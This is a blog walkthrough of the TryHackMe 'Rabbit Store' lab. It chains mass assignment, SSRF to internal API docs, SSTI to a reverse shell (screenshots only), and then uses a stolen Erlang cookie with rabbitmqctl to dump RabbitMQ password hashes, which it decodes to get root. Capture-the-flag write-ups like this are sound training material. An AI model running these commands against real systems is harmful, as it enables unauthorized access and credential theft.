---
title: "TryHackMe Rabbit Store Walkthrough"
description: "TryHackMe Machine Walkthrough"
date: 2025-06-07
categories: [Walkthrough]
tags: [TryHackMe,Rabbit Store, Walkthrough]
image :
    path : https://api.pcloud.com/getpubthumb?code=XZ1Ojj5ZxwN1S11bHGyihLWzKtjGLh311i77&linkpassword=&size=1200x675&crop=0&type=auto
---

Another Linux Lab Machine by TryHackMe , this lab is exploited via chaining multiple exploits to reach RCE .....

| Name       | Rabbit Store |
| ---------- | ------------ |
| Level      | Medium       |
| Technology | Linux        |
| Points     | 60           |
| Platform   | Tryhackme    |

So Let's Start

- First we connect with the VPN or use attack box 

![Image](https://api.pcloud.com/getpubthumb?code=XZwajj5Z6Q3aHdszRezTSfPG3th1nFRdavo7&linkpassword=&size=741x390&crop=0&type=auto)

- Now , we start the machine 

![Image](https://api.pcloud.com/getpubthumb?code=XZtajj5ZuFk5zBst165mHg4UtPFQIF8QRGYy&linkpassword=&size=1606x219&crop=0&type=auto)


## <span style="color: DarkSalmon;"><b># Enumeration</b></span> 
---------
- let's first start with the nmap scan ...

```bash
┌──(kali㉿kali)-[~/tryhackme]
└─$ nmap -sC -sV -p- 10.10.108.94 --min-rate=1500
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 11:48 EDT
Nmap scan report for cloudsite.thm (10.10.108.94)
Host is up (0.19s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/.
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- There are four Open Ports :
    - <b>22</b> (`SSH`)
    - <b>80</b> (`HTTP`)
    - <b>4369</b> (`EPMD`)
    - <b>25672</b> (`Erlang Distribution`)

- we need to add host IP (`cloudsite.thm`) to the `/etc/hosts` host file . 

```bash
┌──(kali㉿kali)-[~/Downloads/tryhackme]
└─$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.10.108.94  cloudsite.thm
```

![Image1](https://api.pcloud.com/getpubthumb?code=XZtOjj5ZlMFMNmblKMBlS8Vd0jvwp5VWzKpy&linkpassword=&size=1452x220&crop=0&type=auto)


- i look at the source code of the page and found another sub domain name `storage.cloudsite.thm` and now lets add this to the 

![Source Code](https://api.pcloud.com/getpubthumb?code=XZiOjj5ZIUbQAVLPd2hzOyVOb5GO9bdTYnO7&linkpassword=&size=1189x96&crop=0&type=auto)

```bash
┌──(kali㉿kali)-[~/tryhackme]
└─$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.10.108.94  cloudsite.thm
10.10.108.94  storage.cloudsite.thm
```

### <b># Creating an Account</b>

- and visiting that page lead us to the login page where register functionality is also working . 

![Image2](https://api.pcloud.com/getpubthumb?code=XZJUjj5Z0hzu5JK0wv87sT26nyiwQpHkALNV&linkpassword=&size=1168x750&crop=0&type=auto)

- i register with the random account email and password 

![Image3](https://api.pcloud.com/getpubthumb?code=XZzUjj5ZSi9BMyygExyT44RSvqkGBzO46QNk&linkpassword=&size=419x534&crop=0&type=auto)

- and when i try to login i got a message `quoted` as ....

![Image4](https://api.pcloud.com/getpubthumb?code=XZ4Ujj5Zp95UedHB23mNVab5m4NKaF0VUB97&linkpassword=&size=937x389&crop=0&type=auto)

- then i analyzed both request in the burp requests section ... 

![Image5](https://api.pcloud.com/getpubthumb?code=XZYUjj5Zn7qb6oa3DcFqGYeyEmI194V4aAcy&linkpassword=&size=1362x371&crop=0&type=auto)
![Image6](https://api.pcloud.com/getpubthumb?code=XZSUjj5ZKDMUr4vMqdSu7yCdezzESkgznR8y&linkpassword=&size=1560x376&crop=0&type=auto)

- and i found out that there is JWT token created to verify all this , and instant though goes thought mind to check this jwt token , and i got these details of my account on the jwt encoded token ... 

![Image7](https://api.pcloud.com/getpubthumb?code=XZ9Ujj5ZVDfoivcsQ2StudgqkVED749WjhXV&linkpassword=&size=759x284&crop=0&type=auto)

- and there is an extra parameter named `"subscription":"inactive"`

![Image8](https://api.pcloud.com/getpubthumb?code=XZfUjj5ZsmcwoHBKc4SCdHpf6Ka6ybjcuz8V&linkpassword=&size=292x227&crop=0&type=auto)

### <b> # Activating the Account</b>

- and then i send another request through the registration page and intercept the request and modifies it with adding an extra parameter goes as `"subscription":"active"`

![Image9](https://api.pcloud.com/getpubthumb?code=XZxUjj5ZFUKd2Tw5U5yEsATH9WTeNJ2vSc2k&linkpassword=&size=780x325&crop=0&type=auto)

- and request got accepted and got message `"User registered successfully"`

![Image10](https://api.pcloud.com/getpubthumb?code=XZlUjj5ZqDpFu0sEm1JCp99ddeOG8BdiRq8V&linkpassword=&size=575x296&crop=0&type=auto)

- and after that when i login in to that acount i found out that , we are able to access to resource and it basically and upload functionality to upload file ..... 

![Image11](https://api.pcloud.com/getpubthumb?code=XZOUjj5ZJI5AMT8ncUm7MGOHXSN3yLEChut7&linkpassword=&size=1258x630&crop=0&type=auto)

- let's see the technolgy it used using wapplyzer

![image0](https://api.pcloud.com/getpubthumb?code=XZNUjj5ZPJgss4BEjWYKQgqD6gx3uuVvGAFy&linkpassword=&size=465x517&crop=0&type=auto)

- but there is a catch here that our file name doesn't shoes up there , and when we access that file it starts downloading automatically and file names stored with a random hash value and that  prompt to us as `File Path` after uploading file . 

![Image12](https://api.pcloud.com/getpubthumb?code=XZGUjj5Z0hWonG3WkxS9JcaKVBxeq4fzDID7&linkpassword=&size=433x456&crop=0&type=auto)

- then i struggle a little and just after it though of fuzzing the api parameters and guess what i found some additional paramters ... 

### <b> # Discovering the API Endpoints</b>

```bash
┌──(kali㉿kali)-[~/tryhackme]
└─$ feroxbuster -u http://storage.cloudsite.thm/api/
                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://storage.cloudsite.thm/api/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        1l        4w       36c http://storage.cloudsite.thm/api/register
405      GET        1l        4w       36c http://storage.cloudsite.thm/api/login
401      GET        1l        3w       32c http://storage.cloudsite.thm/api/uploads
403      GET        1l        2w       27c http://storage.cloudsite.thm/api/docs
405      GET        1l        4w       36c http://storage.cloudsite.thm/api/Login
401      GET        1l        3w       32c http://storage.cloudsite.thm/api/Uploads
403      GET        1l        2w       27c http://storage.cloudsite.thm/api/Docs
405      GET        1l        4w       36c http://storage.cloudsite.thm/api/Register
403      GET        1l        2w       27c http://storage.cloudsite.thm/api/DOCS
```

- and when i visit the `/api/docs` parameter it says access denied ....

![Image13](https://api.pcloud.com/getpubthumb?code=XZ7Ijj5Zl1vn8xjwQlYigQLobN9mp8xp8JoX&linkpassword=&size=737x149&crop=0&type=auto)

-  then i do stupid mistake that there is another upload functionality on the same pageand forgot to scroll down the page . 

![Image14](https://api.pcloud.com/getpubthumb?code=XZXIjj5ZQU1SEARIxHXxAr1aBdOCi8l75BF7&linkpassword=&size=541x450&crop=0&type=auto)

- and here this upload functiolity work as `upload through url` and i test via uploading some file from the local python3 server and its working 

- then i tried to upload the `/api/docs` to the server usign url as `http://storage.cloudsite.thm/api/docs` 

![Image15](https://api.pcloud.com/getpubthumb?code=XZ4Ijj5ZfwwPMg0gTvzX7nBQUx1FpHaEPoUy&linkpassword=&size=1288x340&crop=0&type=auto)

- but when i tried to access this uploaded file i again <b>`access denied`</b>

![Image16](https://api.pcloud.com/getpubthumb?code=XZSIjj5Zk51G9OkC9t50xgqLMX0bfBzcxguy&linkpassword=&size=1335x337&crop=0&type=auto)

- then itried with local host ip and it seems to work but something is missing 

![Image17](https://api.pcloud.com/getpubthumb?code=XZDIjj5ZzVR45PRhWnSN9aombByGCjKVWexy&linkpassword=&size=1332x364&crop=0&type=auto)

- when i try to access this i got `The requested URL wasnot found on this server`

![Image18](https://api.pcloud.com/getpubthumb?code=XZTIjj5ZDR2DOCGFiPfRjwSWV2UHd5TOPT6X&linkpassword=&size=1370x378&crop=0&type=auto)

- then i look in-to response and i found interesting header `x-powered-by: Express` and i notice this on the wapplyzer too ( took help from the internet source ) 
- then i made another request with addition of the poartnumber `3000` , and this time we got success 

![Image19](https://api.pcloud.com/getpubthumb?code=XZgIjj5ZgH9Cz7AIWSygPMLyqP5uxk3aqkyV&linkpassword=&size=1272x358&crop=0&type=auto)

- and i got access to some hidden endpoints , the main was `fetch_message_from_chatbot`

![Image20](https://api.pcloud.com/getpubthumb?code=XZPIjj5Z7OtlGlpzoqBwLFq3MfVJHkp51h0X&linkpassword=&size=1516x484&crop=0&type=auto)

- now i try to acces this parameter and it says `GET method not allowed`

![Image](https://api.pcloud.com/getpubthumb?code=XZKIjj5Z9r51WbMkhpjcKBo2WIKeXQgV1eQy&linkpassword=&size=877x150&crop=0&type=auto)

- making a POST request with an empty json payload , we receive the messege `"username parameter is required"`.

![Image22](https://api.pcloud.com/getpubthumb?code=XZdIjj5ZFCU9ORlDsT01vp8TGqxa95h6P6Ok&linkpassword=&size=1129x314&crop=0&type=auto)

- now , we send a request with the username parameter using jason payload as `{"username":"admin"}`, and then we recieve a message that `sorry admin , our chatbot server is currently under development`

![Image23](https://api.pcloud.com/getpubthumb?code=XZ6Ijj5Zbzg7e3o0bO08FM4nPnNvM5k3n5ck&linkpassword=&size=1371x431&crop=0&type=auto)


### <b># SSTI --> RCE</b>

- as our user suppied username payload reflect in response , now immidietlly i thing of the SSTI check , and it got successfull .... 

![Image24](https://api.pcloud.com/getpubthumb?code=XZ6Ijj5Zbzg7e3o0bO08FM4nPnNvM5k3n5ck&linkpassword=&size=1371x431&crop=0&type=auto )

- now we can try to use the SSTI to RCE payload , first we check if its workign or not .. and it intead workign 

![Image25](https://api.pcloud.com/getpubthumb?code=XZIAjj5ZYvIOxzu8TujyglhPwIXSsSbQqWwk&linkpassword=&size=1398x172&crop=0&type=auto)


## <span style="color: DarkSalmon;"><b># Exploitation</b></span> 

------

- now we try yo get the RCE using this `SSTI to RCE` payload 

![Image26](https://api.pcloud.com/getpubthumb?code=XZaAjj5Zlr8HFurMvkmBS76V0r9TSzOC16Vk&linkpassword=&size=780x390&crop=0&type=auto)

- and we got reverse shell connection to the listner as azrael ..... 

![Image27](https://api.pcloud.com/getpubthumb?code=XZiAjj5Z3IGbqhC6XF7yDfCVrYFombKR9WYy&linkpassword=&size=749x167&crop=0&type=auto)

- to get stable connection i setup ssh connection file for azreal user and copy the id_rsa to attack box ... 

![Image28](https://api.pcloud.com/getpubthumb?code=XZcAjj5ZVSFz60WQPvVHi20f0oNkYYinMm9X&linkpassword=&size=291x120&crop=0&type=auto)

- and using id_rsa file i got connection using ssh as azreal . 

![Image29](https://api.pcloud.com/getpubthumb?code=XZyNjj5ZL7G2AeQ4PMRBnXkG3UemejY1Uzn7&linkpassword=&size=845x600&crop=0&type=auto)

- now i start the python3 server for tranfering file to the server 

![Image30](https://api.pcloud.com/getpubthumb?code=XZzNjj5ZenY4hRiPtSSakGsFvV40mm14Vf87&linkpassword=&size=691x66&crop=0&type=auto)

- and using wget to download the file on the server for automated enumeration ... 

![Image31](https://api.pcloud.com/getpubthumb?code=XZJNjj5ZKvbuTFzXlqmy5IOuWd8lVhc301Fy&linkpassword=&size=1869x198&crop=0&type=auto)

- from here i found some erlang cookie file having cookie value in it 

![Image32](https://api.pcloud.com/getpubthumb?code=XZeNjj5ZaG4giARHrq5lEl1cxQQJmynCRK2V&linkpassword=&size=650x68&crop=0&type=auto)

- so , this is running Rabbitmq messaging server vonfirms via /etc/passwd file ....

![Image33](https://api.pcloud.com/getpubthumb?code=XZnNjj5ZhGv0dIXut4QH7Lrsc2L6N5OvUG2V&linkpassword=&size=785x58&crop=0&type=auto)

- i search for this messaging server and found that it uses the port 4369 and we can even search for it ... 

![Image34](https://api.pcloud.com/getpubthumb?code=XZxNjj5Zv52xsRCvTuSjW9yzVQKT45vj4J67&linkpassword=&size=818x337&crop=0&type=auto)

- Using the Erlang Cookie, we can authenticate and communicate with the RabbitMQ node. Since RabbitMQ nodes have the format `rabbit@<hostname>` by default, we add the target’s hostname (forge) to the /etc/hosts file: ( took hint from internet source )

![Image35](https://api.pcloud.com/getpubthumb?code=XZqNjj5ZW7kfsSHx3aVU5dPeCPYTezBWmCL7&linkpassword=&size=551x199&crop=0&type=auto)

- for this we first need to install the rabbitmq-server 

```bash
sudo apt install rabbitmq-server
```

![Image](https://api.pcloud.com/getpubthumb?code=XZINjj5ZxjxBcOw01yFFnX6xhmAqTby93xYk&linkpassword=&size=1871x166&crop=0&type=auto)

- now we will use this command to communicate to the server and enumerating ..

```bash
sudo rabbitmqctl --erlang-cookie '<cookie-value>' --node rabbit@forge list_users
```

![Image](https://api.pcloud.com/getpubthumb?code=XZiNjj5ZgwX0DzFSqRh2xux5xiBahH3mVxgX&linkpassword=&size=1228x133&crop=0&type=auto)

- Now we will dump the password hashes

```bash
sudo rabbitmqctl --erlang-cookie '<Your_erlang_cookie>' --node rabbit@forge export_definitions /tmp/conf.json
```

![Image36](https://api.pcloud.com/getpubthumb?code=XZpajj5ZTjMcf1Od080bYcHWvD7iMuOxiKvk&linkpassword=&size=1902x388&crop=0&type=auto)

- according to the RabbitMQ documentation this should be the formate to decode it ..
`base64(<4 byte salt> + sha256(<4 byte salt> + <password>))`
- now we will runthis command to convert it correctly ...

```bash
echo -n <entire 49e hash above> | base64 -d | xxd -p -c 100
```

```bash
┌──(kali㉿kali)-[~/Downloads/tryhackme]
└─$ echo -n '49e6hSld<REDECTED>EOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -p -c 100                          
e3d7ba85295d1d16a2617df6f7<Redacted>c43b3f6ec614811ed194f98073585
```

### <b># Root Access</b>

- now we will remove the 4-byte salt (`e3d7ba85`) form the beggining , now will left with the actual hash : 295d1d16a2617df6f7<Redacted>614811ed194f98073585
- using this password we can switch to the root user ... 

```bash
azrael@forge:~/.ssh$ su - root
su - root
Password: 295d1d16a<Redacted>>4811ed194f98073585

whoami
root
/root
-bash: line 3: /root: Is a directory
cat /root/root.txt
eabf7a0b05d3f2028<redacted>
```



## <span style="color: DarkSalmon;"><b># Final Thoughts</b></span>
--------
I hope this blog continues to be helpful in your learning journey!. If you find this blog helpful, I’d love to hear your thoughts — my inbox is always open for feedback. Please excuse any typos, and feel free to point them out so I can correct them. Thanks for understanding and happy learning!. You can contact me on Linkedin and Twitter <br>
[linkdin](https://www.linkedin.com/in/hitesh-sharma-413862245/) <br>
[Twitter](https://x.com/Archtrmntor) <br>
[Machine Platform](https://parrot-ctfs.com/dashboard) <br>